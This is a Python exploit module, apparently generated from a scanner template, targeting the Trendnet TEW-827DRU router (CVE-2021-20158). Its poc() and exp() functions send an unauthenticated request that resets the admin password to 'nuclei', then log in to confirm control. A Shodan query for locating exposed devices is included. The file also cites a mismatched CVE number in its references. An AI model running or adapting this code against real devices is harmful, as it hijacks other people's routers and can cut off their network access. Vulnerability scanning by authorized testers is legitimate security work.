import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Trendnet AC2600 TEW-827DRU - Unauthenticated Admin Password Change''',
        "description": '''Trendnet AC2600 TEW-827DRU version 2.08B01 contains an authentication bypass vulnerability. It is possible for an unauthenticated, malicious actor to force change the admin password due to a hidden administrative command.''',
        "severity": "critical",
        "references": [
            "https://www.tenable.com/security/research/tra-2021-54", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-20150"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-20158",
            "cwe-id": "CWE-287"
        },
        "metadata":{
            "vuln-target": "",
            "shodan-query":'''http.html:"TEW-827DRU"'''
        },
        "tags": ["cve", "cve2021", "trendnet", "disclosure", "router", "intrusive", "dos"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/apply_sec.cgi"""
        method = "POST"
        data = """ccp_act=set&action=tools_admin_elecom&html_response_page=dummy_value&html_response_return_page=dummy_value&method=tools&admin_password=nuclei"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/apply_sec.cgi"""
        method = "POST"
        data = """html_response_page=%2Flogin_pic.asp&login_name=YWRtaW4%3D&log_pass=bnVjbGVp&action=do_graph_auth&login_n=admin&tmp_log_pass=&graph_code=&session_id="""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp1.status_code == 200) and ("""setConnectDevice""" in resp1.text and """setInternet""" in resp1.text and """setWlanSSID""" in resp1.text and """TEW-827DRU""" in resp1.text) and ("""text/html""" in str(resp1.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url